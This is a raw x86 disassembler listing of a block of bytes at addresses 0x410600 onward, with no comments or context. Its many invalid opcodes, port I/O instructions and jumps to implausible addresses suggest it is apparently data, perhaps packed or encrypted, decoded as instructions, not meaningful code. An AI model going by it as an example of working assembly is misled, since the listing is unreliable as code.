  410600:	mov    eax,ds:0xbcdac133
  410605:	(bad)  
  410606:	sti    
  410607:	shl    BYTE PTR [eax],1
  410609:	jmp    0x4105c9
  41060b:	dec    ebp
  41060c:	in     eax,0x8e
  41060e:	jle    0x41064b
  410610:	mov    ds,edx
  410612:	mov    esi,0x421a02fe
  410617:	ds jne 0x4105e6
  41061a:	and    DWORD PTR [esp+ebp*4],esp
  41061d:	push   ecx
  41061e:	or     eax,0x302984a6
  410623:	mov    al,ds:0x58574ffd
  410628:	mov    ah,0xfb
  41062a:	aad    0x6b
  41062c:	jae    0x410617
  41062e:	or     eax,0xb5c7d81
  410633:	jp     0x4105fe
  410635:	sub    ah,bl
  410637:	aas    
  410638:	adc    eax,0x2def9785
  41063d:	pop    es
  41063e:	xor    DWORD PTR ds:0x5c3bc9fa,eax
  410644:	addr16 inc ebx
  410646:	add    al,0xfe
  410648:	cmp    eax,DWORD PTR [ebx-0x3]
  41064b:	mov    dl,0x1c
  41064d:	xor    al,0x38
  41064f:	or     eax,0x5ad9e1f6
  410654:	sub    DWORD PTR [ebx+eax*1+0x47],edx
  410658:	mov    ebp,0xdf0b2d8
  41065d:	(bad)
  410660:	dec    ebx
  410661:	fiadd  DWORD PTR [eax]
  410663:	jle    0x410699
  410665:	xor    edi,DWORD PTR [ebx-0x1d831db5]
  41066b:	or     al,ah
  41066d:	test   al,0x2c
  41066f:	push   ebx
  410670:	inc    ecx
  410671:	popf   
  410672:	pop    ecx
  410673:	shr    BYTE PTR [ebx],0x6c
  410676:	adc    eax,0x5d74a279
  41067b:	(bad)  
  41067c:	data16 shl BYTE PTR [eax+eax*4-0x41b42dfd],0x7f
  410685:	sub    eax,0x3617e61a
  41068a:	out    dx,eax
  41068b:	mov    eax,0xa79911cb
  410690:	clc    
  410691:	pop    ds
  410692:	pop    edi
  410693:	(bad)  
  410694:	push   ds
  410695:	loopne 0x4106bb
  410697:	push   es
  410698:	imul   ebx,ebx,0x78
  41069b:	add    eax,DWORD PTR [esi+ecx*4+0x13940a36]
  4106a2:	xchg   edx,eax
  4106a3:	aaa    
  4106a4:	rcl    DWORD PTR [ecx+0x5da81296],cl
  4106aa:	imul   esi,DWORD PTR [esi+eiz*2+0x3845f9b0],0x79
  4106b2:	pop    ds
  4106b3:	imul   DWORD PTR [edi]
  4106b5:	gs mov dh,0x7a
  4106b8:	xchg   edx,eax
  4106b9:	or     edi,ecx
  4106bb:	mov    eax,ds:0x19ace389
  4106c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c1:	je     0x4106a0
  4106c3:	jp     0x41072c
  4106c5:	add    eax,0x96ef23d5
  4106ca:	mov    bh,BYTE PTR ds:0xe97d33ce
  4106d0:	adc    ch,BYTE PTR [ecx]
  4106d2:	mov    dl,0x88
  4106d4:	int3   
  4106d5:	jge    0x4106b7
  4106d7:	mov    eax,0x79e3aeeb
  4106dc:	(bad)  
  4106dd:	in     al,0xea
  4106df:	int    0x2f
  4106e1:	shl    bl,cl
  4106e3:	dec    ebx
  4106e4:	sbb    edx,DWORD PTR [ebp+ebp*1+0x6980c2c3]
  4106eb:	gs int 0x15
  4106ee:	(bad)  
  4106ef:	(bad)  
  4106f0:	rcl    esi,1
  4106f2:	(bad)  
  4106f3:	mov    esp,0xdcc08f2e
  4106f8:	ins    DWORD PTR es:[edi],dx
  4106f9:	call   0xf2ff0177
  4106fe:	(bad)  
  4106ff:	in     al,0xcc
  410701:	adc    edx,ebx
  410703:	and    eax,0x9a602c6f
  410708:	pushf  
  410709:	push   ss
  41070a:	sti    
  41070b:	adc    BYTE PTR [edi],cl
  41070d:	mov    ?,esp
  41070f:	dec    esi
  410710:	mov    al,fs:0xc31894c6
  410716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410717:	mov    bl,0x95
  410719:	retf   
  41071a:	cmp    ecx,ebx
  41071c:	xchg   BYTE PTR [ebp-0x1f],ch
  41071f:	xor    ch,BYTE PTR [edx-0x722adb86]
  410725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410726:	mov    ds:0xb077cffe,eax
  41072b:	cmp    ch,BYTE PTR [eax-0x6d73b665]
  410731:	mov    WORD PTR ds:0x8034cb39,ds
  410737:	out    dx,al
  410738:	ror    edi,1
  41073a:	push   eax
  41073b:	sahf   
  41073c:	and    edx,ecx
  41073e:	cli    
  41073f:	and    eax,0x2da51b9f
  410744:	nop
  410745:	dec    eax
  410746:	sub    dl,BYTE PTR [ebx]
  410748:	push   0xc1eacb6e
  41074d:	scas   al,BYTE PTR es:[edi]
  41074e:	push   esp
  41074f:	cmp    bh,dl
  410751:	push   ds
  410752:	outs   dx,BYTE PTR ds:[esi]
  410753:	lods   eax,DWORD PTR ds:[esi]
  410754:	bound  ecx,QWORD PTR [eax+0x3c2cc6af]
  41075a:	jb     0x4107cd
  41075c:	push   ss
  41075d:	xor    eax,DWORD PTR [esi]
  41075f:	mov    ebx,0x8509632f
  410764:	ficomp DWORD PTR [esi]
  410766:	push   ecx
  410767:	jg     0x41076a
  410769:	jmp    0x410732
  41076b:	xchg   esi,eax
  41076c:	retf   0x49bc
  41076f:	daa    
  410770:	or     eax,0x107161e1
  410775:	push   ecx
  410776:	(bad)  
  410777:	jno    0x410705
  410779:	pop    edi
  41077a:	or     BYTE PTR [eax+0x22],0x72
  41077e:	xchg   edi,eax
  41077f:	icebp  
  410780:	fsubr  DWORD PTR [ecx+0x9]
  410783:	stos   DWORD PTR es:[edi],eax
  410784:	inc    esi
  410785:	mov    esp,0x29668d73
  41078a:	pop    ecx
  41078b:	or     eax,0x4dfe5031
  410790:	xlat   BYTE PTR ds:[ebx]
  410791:	lahf   
  410792:	add    edx,ecx
  410794:	hlt    
  410795:	jg     0x4107e0
  410797:	xchg   BYTE PTR [edx],ah
  410799:	repnz aas 
  41079b:	cmp    eax,0xbaef678c
  4107a0:	inc    ebx
  4107a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107a2:	outs   dx,DWORD PTR ds:[esi]
  4107a3:	xchg   ebp,eax
  4107a4:	sbb    DWORD PTR [ebp-0x76],ebp
  4107a7:	and    BYTE PTR [ecx+0x56],ch
  4107aa:	fsubr  DWORD PTR [edi-0x26]
  4107ad:	fcom   DWORD PTR [edx]
  4107af:	mov    bl,0x27
  4107b1:	(bad)  [eax]
  4107b3:	imul   ecx,DWORD PTR [edx-0x389aeeb8],0xa
  4107ba:	rol    DWORD PTR [ecx-0x18332e43],1
  4107c0:	add    DWORD PTR [eax-0x214a2216],edi
  4107c6:	mov    ?,WORD PTR [eax+0x31]
  4107c9:	adc    BYTE PTR [edi-0x27],cl
  4107cc:	mov    esp,0x99d26038
  4107d1:	add    ah,al
  4107d3:	pop    ebx
  4107d4:	aaa    
  4107d5:	mov    bh,0x54
  4107d7:	dec    eax
  4107d8:	call   0x92572d18
  4107dd:	add    DWORD PTR [ebp+0x54],esi
  4107e0:	fbld   TBYTE PTR gs:[eax-0x72]
  4107e4:	seto   BYTE PTR [edx]
  4107e7:	call   0x2e3c:0xfb0c988c
  4107ee:	xor    cl,dh
  4107f0:	repz push ebx
  4107f2:	(bad)  
  4107f3:	push   ss
  4107f4:	loop   0x41079a
  4107f6:	mov    ebp,ebp
  4107f8:	and    BYTE PTR [edx],ch
  4107fa:	fcomp  DWORD PTR [eax]
  4107fc:	sbb    eax,0xb14e576e
  410801:	mov    edi,0xaebacdd3
  410806:	fst    DWORD PTR [ebp+0x40]
  410809:	mov    esi,DWORD PTR [edx+0x2c]
  41080c:	cs jae 0x410862
  41080f:	or     BYTE PTR [ebx],bh
  410811:	mov    eax,0xe4c60f8b
  410816:	repnz das 
  410818:	mov    ah,BYTE PTR [ebx]
  41081a:	out    0x3d,eax
  41081c:	imul   ecx,ebp,0x77
  41081f:	or     dh,al
  410821:	or     edi,DWORD PTR [esi+0x14be5368]
  410827:	cli    
  410828:	rcl    ebp,0xb6
  41082b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41082c:	xlat   BYTE PTR ds:[ebx]
  41082d:	mov    cl,0xe9
  41082f:	outs   dx,DWORD PTR ds:[esi]
  410830:	dec    esp
  410831:	ficom  WORD PTR [ecx+0x675ba244]
  410837:	gs retf 0x5704
  41083b:	fimul  WORD PTR [ecx]
  41083d:	fmul   st,st(7)
  41083f:	push   0x1b217902
  410844:	rcr    DWORD PTR [ecx-0x46],1
  410847:	imul   ebp,ecx,0x9d051e2a
  41084d:	fidiv  DWORD PTR [ecx]
  41084f:	in     eax,dx
  410850:	and    bl,bh
  410852:	fisub  DWORD PTR [ebx]
  410854:	div    DWORD PTR [esi]
  410856:	push   esi
  410857:	mov    ah,0xd
  410859:	leave  
  41085a:	mov    ah,0x61
  41085c:	clc    
  41085d:	out    0xc3,eax
  41085f:	shl    DWORD PTR ds:0xf55d29ff,0x98
  410866:	xchg   edi,eax
  410867:	or     bh,BYTE PTR [eax+0x7]
  41086a:	sbb    DWORD PTR [eax-0x32beb7df],ebp
  410870:	mov    bl,0x57
  410872:	lea    esp,[ebp+0x5b]
  410875:	xchg   edi,eax
  410876:	jmp    0x4108ee
  410878:	dec    esp
  410879:	jmp    0x5513fb1a
  41087e:	push   ebx
  41087f:	or     ecx,ecx
  410881:	jmp    0x1cc6:0xdf59ce38
  410888:	dec    cx
  41088a:	fnsave [edi+0x5f]
  41088d:	das    
  41088e:	loope  0x410901
  410890:	leave  
  410891:	xchg   ebx,eax
  410892:	or     ebp,eax
  410894:	mov    ds:0x1fc8da3f,eax
  410899:	popf   
  41089a:	popf   
  41089b:	mov    cl,0x58
  41089d:	imul   edi,DWORD PTR ds:0xbdde7c27,0x29bfef76
  4108a7:	sbb    al,0x10
  4108a9:	cmp    DWORD PTR [bx+di+0x70],edx
  4108ad:	mov    ebp,DWORD PTR [edi+0xfae5bcf]
  4108b3:	hlt    
  4108b4:	rcl    BYTE PTR [edx+ebp*1-0xd94c5d4],0x7f
  4108bc:	cdq    
  4108bd:	adc    ecx,edi
  4108bf:	pop    eax
  4108c0:	sub    DWORD PTR [ebp-0xd43f714],ebx
  4108c6:	in     eax,0x6a
  4108c8:	mov    al,ds:0xf1030be0
  4108cd:	scas   eax,DWORD PTR es:[edi]
  4108ce:	push   eax
  4108cf:	add    eax,0x7a23b1e2
  4108d4:	xor    al,0x94
  4108d6:	(bad)  
  4108d7:	retf   
  4108d8:	mov    ds:0x528778a7,eax
  4108dd:	push   eax
  4108de:	lods   al,BYTE PTR ds:[esi]
  4108df:	add    ah,al
  4108e1:	mov    dh,0xf9
  4108e3:	pushf  
  4108e4:	cmp    ah,BYTE PTR [edi+0x4a2fb2da]
  4108ea:	test   DWORD PTR [esi+ecx*1+0xb],ebx
  4108ee:	fsubr  st(3),st
  4108f0:	xchg   BYTE PTR [ebx],dl
  4108f2:	mov    dl,0x7d
  4108f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108f5:	and    cl,BYTE PTR [edi+edx*2-0xd]
  4108f9:	mov    edi,0x60b2abc4
  4108fe:	add    bl,BYTE PTR [eax-0x8]
  410901:	stos   DWORD PTR es:[edi],eax
  410902:	mov    ds:0x1d541bf4,eax
  410907:	inc    eax
  410908:	adc    eax,DWORD PTR ds:0xaadedae4
  41090e:	push   ebx
  41090f:	xchg   edi,eax
  410910:	sub    DWORD PTR [eax-0x44e2a6b],0x39
  410917:	cwde   
  410918:	or     ah,BYTE PTR ds:0x6017720
  41091e:	shl    ebp,cl
  410920:	mov    bl,0x5c
  410922:	gs or  al,0xd3
  410926:	xchg   ebx,eax
  410927:	mov    DWORD PTR [ecx],0x1662fb8
  41092d:	enter  0xb9a0,0xad
  410931:	push   es
  410932:	stos   BYTE PTR es:[edi],al
  410933:	mov    gs,WORD PTR [edi+eiz*4]
  410936:	imul   eax,DWORD PTR [edx-0x34682a5b],0x67
  41093d:	std    
  41093e:	ror    BYTE PTR [eax+eiz*2-0x52],cl
  410942:	sub    al,0x80
  410944:	and    dh,BYTE PTR [ecx]
  410946:	cwde   
  410947:	sti    
  410948:	jg     0x4109c6
  41094a:	jl     0x410917
  41094c:	scas   al,BYTE PTR es:[edi]
  41094d:	(bad)  
  41094e:	(bad)  
  41094f:	clc    
  410950:	sti    
  410951:	fistp  QWORD PTR [ecx+0x11]
  410954:	dec    sp
  410956:	xor    eax,DWORD PTR ds:0xe3f8ccea
  41095c:	jns    0x410971
  41095e:	mov    cl,0x4b
  410960:	(bad)  
  410961:	mov    ebp,0x6109d2ec
  410966:	xor    ch,BYTE PTR [edi-0xc]
  410969:	push   edx
  41096a:	out    dx,eax
  41096b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41096d:	mov    eax,0x679bf98a
  410972:	in     eax,0x9f
  410974:	retf   0xab24
  410977:	dec    ebp
  410978:	pop    ss
  410979:	mov    gs,WORD PTR [edi]
  41097b:	sbb    ebx,eax
  41097d:	icebp  
  41097e:	jmp    0x410923
  410980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410981:	lock fstp TBYTE PTR [edx]
  410984:	test   eax,0xb3707297
  410989:	lahf   
  41098a:	mov    eax,0x362a29b5
  41098f:	push   ebp
  410990:	rcl    BYTE PTR gs:[edi+eax*4],cl
  410994:	jp     0x410951
  410996:	pop    edx
  410997:	into   
  410998:	fs pop eax
  41099a:	lods   al,BYTE PTR ds:[esi]
  41099b:	retf   
  41099c:	std    
  41099d:	and    ecx,DWORD PTR [ecx]
  41099f:	sub    ah,BYTE PTR [ebx-0x5]
  4109a2:	test   DWORD PTR [edi+edi*1],ecx
  4109a5:	nop
  4109a6:	into   
  4109a7:	outs   dx,BYTE PTR ds:[esi]
  4109a8:	leave  
  4109a9:	xchg   edx,eax
  4109aa:	fstp   TBYTE PTR [edi-0x2f5f0610]
  4109b0:	aaa    
  4109b1:	add    ebx,edx
  4109b3:	out    dx,eax
  4109b4:	add    DWORD PTR [esi+esi*1],esi
  4109b7:	clc    
  4109b8:	or     al,BYTE PTR [edx]
  4109ba:	mov    al,ds:0x1fdccb6
  4109bf:	shl    DWORD PTR [ecx+ebp*2],0x4a
  4109c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c4:	pop    ebx
  4109c5:	cwde   
  4109c6:	add    al,0x1b
  4109c8:	imul   edx,DWORD PTR [eax+edx*1-0x752e6f62],0x38ae6ed7
  4109d3:	fist   WORD PTR [ecx-0x29]
  4109d6:	pop    eax
  4109d7:	rcr    DWORD PTR [ecx],0xd3
  4109da:	lds    edi,FWORD PTR [edi+edi*4]
  4109dd:	lods   eax,DWORD PTR ds:[esi]
  4109de:	inc    esp
  4109df:	inc    esp
  4109e0:	call   0x36e1:0xf7a4aacd
  4109e7:	loop   0x41097d
  4109e9:	aaa    
  4109ea:	jmp    0x3a651d6f
  4109ef:	popa   
  4109f0:	test   eax,0x171d9780
  4109f5:	pop    esp
  4109f6:	or     BYTE PTR [esi+0x31948bb1],al
  4109fc:	jmp    0x410a07
  4109fe:	pop    es
  4109ff:	fild   WORD PTR [ecx+0x53624a99]
  410a05:	jns    0x410a1b
  410a07:	mov    ebp,0x871f7adf
  410a0c:	add    eax,0x8bc31e6f
  410a11:	push   ds
  410a12:	out    0xe4,eax
  410a14:	mov    bh,0x18
  410a16:	inc    esi
  410a17:	xchg   edi,eax
  410a18:	jo     0x410a4a
  410a1a:	lds    ebx,FWORD PTR [ebx+0xb]
  410a1d:	test   DWORD PTR [edi],edx
  410a1f:	or     DWORD PTR [edi],eax
  410a21:	add    ch,ah
  410a23:	dec    esp
  410a24:	pop    ebx
  410a25:	mov    ds:0x3eb7abc7,eax
  410a2a:	hlt    
  410a2b:	sub    eax,DWORD PTR [edx+eiz*8+0x7d6fdbf4]
  410a32:	mov    DWORD PTR [eax+ebp*2],ebx
  410a35:	and    eax,0x6011f016
  410a3a:	(bad)  
  410a3b:	call   0x6ffad7cc
  410a40:	jl     0x410aae
  410a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a43:	xchg   esp,eax
  410a44:	sub    al,0x68
  410a46:	mov    ebp,DWORD PTR [ebx+0x33]
  410a49:	mov    ds:0xe9978574,eax
  410a4e:	mov    ebp,ebp
  410a50:	idiv   DWORD PTR [ebp+0x48]
  410a53:	fist   DWORD PTR [esi-0x6deca0a1]
  410a59:	stos   DWORD PTR es:[edi],eax
  410a5a:	mov    dl,0x12
  410a5c:	enter  0xd6a2,0xd8
  410a60:	fdivr  DWORD PTR [ecx-0x2c]
  410a63:	inc    ebp
  410a64:	gs es push cs
  410a67:	popf   
  410a68:	mov    cl,BYTE PTR [eax-0x58]
  410a6b:	gs sti 
  410a6d:	xor    al,0x4f
  410a6f:	fadd   DWORD PTR [edi]
  410a71:	cmp    DWORD PTR [esi-0x62],0xf93441e2
  410a78:	popf   
  410a79:	iret   
  410a7a:	add    DWORD PTR [esi-0x22],eax
  410a7d:	pop    esp
  410a7e:	dec    esp
  410a7f:	sub    BYTE PTR [edi],ah
  410a81:	adc    al,0xc0
  410a83:	fisttp QWORD PTR [esi+0x1e]
  410a86:	or     esp,ebx
  410a88:	sti    
  410a89:	mov    dh,0xdb
  410a8b:	clc    
  410a8c:	popa   
  410a8d:	sub    eax,0x3be47891
  410a92:	dec    eax
  410a93:	je     0x410abd
  410a95:	shr    DWORD PTR [ebx-0x1cabd0c5],1
  410a9b:	das    
  410a9c:	stos   BYTE PTR es:[edi],al
  410a9d:	xor    ebx,DWORD PTR [eax+0x1d38b9d6]
  410aa3:	ret    
  410aa4:	test   eax,0x46791ec6
  410aa9:	xchg   ebp,eax
  410aaa:	jmp    0x410aee
  410aac:	das    
  410aad:	aam    0x99
  410aaf:	adc    ah,bl
  410ab1:	in     eax,0x6
  410ab3:	xor    bh,0xf2
  410ab6:	cmp    DWORD PTR [edx-0x11],edx
  410ab9:	(bad)  
  410aba:	pop    ss
  410abb:	fwait
  410abc:	je     0x410b2a
  410abe:	jmp    0x359947d7
  410ac3:	outs   dx,DWORD PTR ds:[esi]
  410ac4:	leave  
  410ac5:	sahf   
  410ac6:	push   cs
  410ac7:	ja     0x410a68
  410ac9:	stos   DWORD PTR es:[edi],eax
  410aca:	(bad)  
  410acc:	mov    dh,0xb
  410ace:	jle    0x410ab6
  410ad0:	adc    dl,bh
  410ad2:	in     al,0x6b
  410ad4:	bound  eax,QWORD PTR [ecx]
  410ad6:	ins    DWORD PTR es:[edi],dx
  410ad7:	mov    ebp,DWORD PTR [esi+0xf1220d9]
  410add:	rcr    DWORD PTR [ecx+0x24],cl
  410ae0:	or     al,0x29
  410ae2:	add    dh,ah
  410ae4:	in     eax,dx
  410ae5:	inc    DWORD PTR [edx]
  410ae7:	sbb    al,BYTE PTR [ebx]
  410ae9:	scas   eax,DWORD PTR es:[edi]
  410aea:	adc    dh,bh
  410aec:	sub    cl,cl
  410aee:	nop
  410aef:	or     al,0xf2
  410af1:	shr    esp,1
  410af3:	shl    BYTE PTR [edi-0x1254c532],0x9
  410afa:	jae    0x410abb
  410afc:	dec    edx
  410afd:	sub    bh,BYTE PTR [edi]
  410aff:	imul   esi,DWORD PTR [ebp+0x688c3578],0x37bd126e
  410b09:	and    cl,BYTE PTR [edx+0x51]
  410b0c:	mov    ds:0x3775209f,al
  410b11:	mov    ds:0xcf28ba1c,eax
  410b16:	push   di
  410b18:	pop    edi
  410b19:	hlt    
  410b1a:	fistp  DWORD PTR [eax-0x30986f49]
  410b20:	nop
  410b21:	lock xor DWORD PTR [ebx+0x25],ebx
  410b25:	repnz add dl,BYTE PTR ds:0xbdd98c50
  410b2c:	and    DWORD PTR [ebx-0x2763e0a3],ebp
  410b32:	mov    DWORD PTR [edx-0x121e5f89],esi
  410b38:	pop    edx
  410b39:	or     ebp,DWORD PTR [esi-0x110ec8c0]
  410b3f:	mov    ch,0x6d
  410b41:	neg    edx
  410b43:	and    ah,BYTE PTR [edi-0x2]
  410b46:	fwait
  410b47:	cmp    eax,0x5b90eac4
  410b4c:	iret   
  410b4d:	in     al,dx
  410b4e:	pop    es
  410b4f:	xor    BYTE PTR [ebx-0x2],ah
  410b52:	sub    eax,0xe278e56e
  410b57:	jl     0x410b99
  410b59:	jle    0x410b6a
  410b5b:	repnz add eax,0xd2a7720b
  410b61:	cld    
  410b62:	iret   
  410b63:	test   BYTE PTR [ebx+ebx*2-0x31c2ec08],dh
  410b6a:	rcl    DWORD PTR [eax],0xb1
  410b6d:	clc    
  410b6e:	pop    edx
  410b6f:	pop    ss
  410b70:	mov    dl,cl
  410b72:	push   ebp
  410b73:	clc    
  410b74:	sub    eax,0x5675923b
  410b79:	mov    dh,0xbf
  410b7b:	cld    
  410b7c:	test   DWORD PTR [eax],ecx
  410b7e:	pop    esp
  410b7f:	imul   ebp,DWORD PTR [ebp+ebp*1-0x3c13ffab],0x18ac6d3f
  410b8a:	paddusw mm2,QWORD PTR [ecx+0x7c7b0cd6]
  410b91:	test   dl,al
  410b93:	and    al,BYTE PTR [edx+0x8]
  410b96:	ins    DWORD PTR es:[edi],dx
  410b97:	mov    ebx,0x28baae44
  410b9c:	(bad)  
  410b9d:	jecxz  0x410b85
  410b9f:	pop    ebp
  410ba0:	(bad)  
  410ba1:	test   al,0xeb
  410ba3:	lds    ecx,FWORD PTR [edi+0x41]
  410ba6:	and    eax,0x9f802b7d
  410bab:	pop    ebp
  410bac:	inc    ebp
  410bad:	inc    dh
  410baf:	shld   DWORD PTR [eax-0x77a80092],eax,cl
  410bb6:	sbb    cl,BYTE PTR [esi+0x23]
  410bb9:	arpl   WORD PTR [ebx+0x2c9155b4],di
  410bbf:	ret    0xf530
  410bc2:	push   edi
  410bc3:	pop    ecx
  410bc4:	sar    DWORD PTR [esi],0xf0
  410bc7:	and    DWORD PTR [esi],ebx
  410bc9:	sub    BYTE PTR fs:[esi+0x4],al
  410bcd:	xor    DWORD PTR [ebx],ebp
  410bcf:	jge    0x410c21
  410bd1:	cmp    edi,ecx
  410bd3:	mov    ebx,0x3349ba0b
  410bd8:	pop    ebx
  410bd9:	or     DWORD PTR [esi+0x76],ecx
  410bdc:	shr    DWORD PTR [edx-0x53],1
  410bdf:	cmp    al,BYTE PTR [esi-0x3]
  410be2:	scas   eax,DWORD PTR es:[edi]
  410be3:	dec    ebp
  410be4:	xchg   edi,eax
  410be5:	xor    eax,0xa4172162
  410bea:	pop    ebx
  410beb:	lock js 0x410c04
  410bee:	mov    ebx,0x62b91826
  410bf3:	add    eax,DWORD PTR [edi+0x60cf80f4]
  410bf9:	xchg   esp,eax
  410bfa:	pushf  
  410bfb:	cmp    al,0xc8
  410bfd:	data16 (bad) 
  410bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c00:	xchg   ebx,eax
  410c01:	xchg   cl,cl
  410c03:	rcl    ch,1
  410c05:	jmp    0xcc1e:0x6b42143a
  410c0c:	mov    ebx,0x104015b0
  410c11:	or     ah,BYTE PTR [ebp-0x7ad89889]
  410c17:	ss mov edi,0x77eca11c
  410c1d:	and    dl,BYTE PTR [eax+0x1d]
  410c20:	mov    ds:0xa17120ce,eax
  410c25:	rcl    BYTE PTR [ecx+0x69],1
  410c28:	jo     0x410c8f
  410c2a:	push   ss
  410c2b:	jmp    0xd2a9:0x7a313a19
  410c32:	pop    ebp
  410c33:	das    
  410c34:	scas   al,BYTE PTR es:[edi]
  410c35:	push   ecx
  410c36:	jmp    0xdefd:0x1da664ce
  410c3d:	dec    esi
  410c3e:	sti    
  410c3f:	test   BYTE PTR [edx-0x69],0x57
  410c43:	mov    gs,WORD PTR [edx+0x58e70456]
  410c49:	pusha  
  410c4a:	das    
  410c4b:	cld    
  410c4c:	cmp    BYTE PTR [edi+0x29fb67e9],0xc2
  410c53:	lds    ecx,FWORD PTR [eax+0x7d4ba944]
  410c59:	or     eax,0xdd337347
  410c5e:	sbb    eax,DWORD PTR [ecx+0x47]
  410c61:	inc    esi
  410c62:	sbb    cl,BYTE PTR ds:0x89c3f9ea
  410c68:	(bad)  
  410c69:	xchg   edx,eax
  410c6a:	jl     0x410c83
  410c6c:	xor    eax,0x620fe43b
  410c71:	fcmove st,st(7)
  410c73:	sbb    DWORD PTR [ecx+ebx*4-0x43f36773],esi
  410c7a:	sub    ah,BYTE PTR [ebx-0x3]
  410c7d:	push   esp
  410c7e:	cmp    al,ch
  410c80:	test   DWORD PTR [eax-0x61450c0d],0x34959abd
  410c8a:	std    
  410c8b:	inc    edx
  410c8c:	cmp    eax,DWORD PTR [esi-0x20]
  410c8f:	sbb    eax,0x910ec1a4
  410c94:	mov    eax,0x32a9a2e2
  410c99:	fadd   QWORD PTR [eax]
	...
  410d13:	add    BYTE PTR [ecx-0x4046497c],bh
  410d19:	mov    ebx,0xac284bf
  410d1e:	mov    ebp,DWORD PTR [edx-0x5d]
  410d21:	sbb    DWORD PTR [eax],ebp
  410d23:	mov    esi,0xb7ef
  410d28:	outs   dx,BYTE PTR ds:[esi]
  410d29:	pop    es
  410d2a:	add    BYTE PTR [eax],al
  410d2c:	or     BYTE PTR [ebp+0x189bed9c],al
  410d32:	xor    eax,0xe1464cdd
  410d37:	call   0x7f8afee6
  410d3c:	push   cs
  410d3d:	iret   
  410d3e:	inc    ebx
  410d3f:	fisubr WORD PTR [eax-0x7319df80]
  410d45:	and    eax,0xd7d09718
  410d4a:	pop    ds
  410d4b:	cs fwait
  410d4d:	mov    dh,0x47
  410d4f:	mov    edi,0xed3c5964
  410d54:	dec    ecx
  410d55:	mov    esp,0x43c9d27e
  410d5a:	push   esp
  410d5b:	jo     0x410d68
  410d5d:	mov    edi,DWORD PTR [edx+0x5fe46d59]
  410d63:	adc    dh,bh
  410d65:	mov    edi,DWORD PTR [ebp+ebx*4+0x2]
  410d69:	loope  0x410d09
  410d6b:	dec    ecx
  410d6c:	fs inc ebp
  410d6e:	in     eax,dx
  410d6f:	sub    al,0x2f
  410d71:	test   al,0x37
  410d73:	ds lahf 
  410d75:	pop    ds
  410d76:	push   0xffffffbe
  410d78:	aas    
  410d79:	sub    BYTE PTR [ecx-0x70],cl
  410d7c:	test   esp,eax
  410d7e:	outs   dx,BYTE PTR ds:[esi]
  410d7f:	push   ss
  410d80:	pop    edi
  410d81:	hlt    
  410d82:	nop
  410d83:	lea    esi,[ebx+esi*8]
  410d86:	xor    DWORD PTR [edx+0x43],edx
  410d89:	push   esp
  410d8a:	mov    ecx,0xdb95c22b
  410d8f:	aam    0x25
  410d91:	mov    ch,0x46
  410d93:	and    BYTE PTR [eax+0x44e713fe],bh
  410d99:	xor    esp,ebx
  410d9b:	aam    0xdc
  410d9d:	outs   dx,BYTE PTR ds:[esi]
  410d9e:	inc    esp
  410d9f:	sbb    eax,0x440128e4
  410da4:	sbb    DWORD PTR [ebp-0x286b6eb5],edi
  410daa:	mov    ebx,0xec5af4e5
  410daf:	sbb    eax,0x49b48eb0
  410db4:	add    bh,bl
  410db6:	dec    eax
  410db7:	shl    ecx,cl
  410db9:	js     0x410e39
  410dbb:	(bad)  
  410dbc:	and    BYTE PTR [ebx+0x54],cl
  410dbf:	repz mov edx,0xf42c349
  410dc5:	repnz pop ecx
  410dc7:	ret    
  410dc8:	adc    eax,ecx
  410dca:	mov    DWORD PTR [eax+eax*8],edx
  410dcd:	fs fwait
  410dcf:	sahf   
  410dd0:	jmp    0x410d86
  410dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd3:	push   cs
  410dd4:	into   
  410dd5:	es (bad) 
  410dd8:	stos   BYTE PTR es:[edi],al
  410dd9:	inc    ebp
  410dda:	enter  0x5cc3,0x8f
  410dde:	test   al,0x67
  410de0:	add    bl,BYTE PTR ds:0x69e61d65
  410de6:	mov    DWORD PTR [edx+0x7e],0x651aacb6
  410ded:	mov    dh,BYTE PTR [ebx-0x5cdc5bf4]
  410df3:	in     al,dx
  410df4:	out    dx,al
  410df5:	mov    ebx,0xe30dbb02
  410dfa:	or     edi,eax
  410dfc:	cmp    DWORD PTR [edi-0x48f1283d],edi
  410e02:	(bad)  
  410e03:	and    al,0x82
  410e05:	test   eax,0xab59a84b
  410e0a:	xor    BYTE PTR [edi+edi*2+0x69de983d],al
  410e11:	test   eax,0xcc378c66
  410e16:	in     eax,0xb2
  410e18:	mov    edx,0x9657a37a
  410e1d:	jle    0x410dd8
  410e1f:	adc    eax,0xa755970c
  410e24:	lods   al,BYTE PTR ds:[esi]
  410e25:	and    ch,bh
  410e27:	mov    edi,0x4d168abd
  410e2c:	out    0xbe,eax
  410e2e:	call   0xb1231895
  410e33:	loopne 0x410e88
  410e35:	retf   
  410e36:	test   al,0x91
  410e38:	sbb    al,0x70
  410e3a:	push   esi
  410e3b:	jge    0x410e36
  410e3d:	shl    BYTE PTR [eax+0xb6b8cb3],1
  410e43:	pop    es
  410e44:	std    
  410e45:	sub    DWORD PTR [eax+0x2f98c820],ecx
  410e4b:	sbb    dh,ch
  410e4d:	push   ebp
  410e4e:	(bad)  
  410e4f:	sbb    eax,DWORD PTR es:[eax]
  410e52:	cmp    edx,edx
  410e54:	inc    esi
  410e55:	cld    
  410e56:	ror    ebp,0x5c
  410e59:	pop    esi
  410e5a:	leave  
  410e5b:	test   BYTE PTR [ebx-0x48],dh
  410e5e:	(bad)  
  410e5f:	adc    al,0x19
  410e61:	add    bl,ch
  410e63:	xor    al,ah
  410e65:	and    al,0xd2
  410e67:	sti    
  410e68:	add    eax,0x93fbc2f5
  410e6d:	adc    dl,bh
  410e6f:	hlt    
  410e70:	es retf 
  410e72:	inc    esi
  410e73:	add    DWORD PTR [eax+0x42],ebp
  410e76:	add    ah,bl
  410e78:	ds jmp 0x2da814be
  410e7e:	pusha  
  410e7f:	popf   
  410e80:	ds (bad) 
